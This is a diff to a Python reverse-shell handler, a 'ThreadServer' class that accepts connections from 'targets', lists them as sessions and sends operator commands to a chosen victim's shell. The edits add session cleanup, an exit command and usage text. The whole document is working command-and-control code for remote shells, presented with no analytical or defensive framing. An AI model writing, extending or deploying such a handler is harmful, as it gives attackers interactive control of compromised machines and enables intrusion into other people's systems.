@@ -66,7 +66,7 @@ class ThreadServer:
         json_data = dumps(data)
         target.send(json_data.encode('utf-8'))
 
-    def shell(self, target):
+    def shell(self, target, ip):
         print(Color("[+] Connection Established").bold_green())
         print()
         while True:
@@ -75,6 +75,11 @@ class ThreadServer:
                 command = 'dir'
             self.safe_send(command, target)
             if command == 'quit':
+                break
+            elif command == "exit":
+                target.close()
+                self.targets.remove(target)
+                self.ips.remove(ip)
                 break
             elif command[:2] == 'cd' and len(command) > 1:
                 continue
@@ -113,36 +118,41 @@ class ThreadServer:
     def thread(self):
         t1 = Thread(target=self.server)
         t1.start()
-        questions = []
+        count = 0
         while True:
             command = self.ps1()
+            if ((command == "targets" or "session" in command)
+                    and (not self.targets or not self.ips)):
+                print(Color("\n[!] No Targets Found.").bold_red())
+                print(Color("[*] Is a Reverse Shell Running?\n").yellow())
+                continue
             if command == "targets":
-                questions = []
-                count = 0
+                count = 1
                 for ip in self.ips:
                     prompt = f"Session {str(count)}. <---> {str(ip)}"
                     print(Color(prompt).green())
                     count += 1
             elif command[:7] == "session":
-                questions = []
                 try:
                     num = int(command[8:])
                     num -= 1
                     tar_num = self.targets[num]
-                    _ = self.ips[num]
-                    self.shell(tar_num)
-                except IndexError:
-                    prompt = "\n[!] No Session Under That Number\n"
+                    tar_ip = self.ips[num]
+                    self.shell(tar_num, tar_ip)
+                except (IndexError, ValueError):
+                    prompt = "\n[!] No Session Matches That Selection\n"
                     print(Color(prompt).bold_red())
-                except ValueError:
-                    prompt = "\n[!] No Session Under That Number\n"
-                    print(Color(prompt).bold_red())
+            elif command == "exit":
+                for target in self.targets:
+                    target.close()
+                self.sock.close()
+                self.stop_threads = True
             else:
-                print()
-                prompt = Color("[?]").bold_red()
-                questions.append(prompt)
-                print(*questions)
-                print()
+                usage = ("\n[*] Usage:\n\n"
+                         "target              --> view available targets\n"
+                         "session <number>    --> select target by index\n")
+                print(Color(usage).yellow())
+                count += 1
 
     def server(self):
         while True:
@@ -153,8 +163,8 @@ class ThreadServer:
                 target, ip = self.sock.accept()
                 self.targets.append(target)
                 self.ips.append(ip)
-                connect = (f"[+] {self.targets[self.clients]} --- "
-                           f"{self.ips[self.clients]} Has Connected!")
+                connect = (f"{self.targets[self.clients]} --- "
+                           f"{self.ips[self.clients]} Connected!")
                 print(Color(connect).bold_green())
                 self.clients += 1
             except OSError:
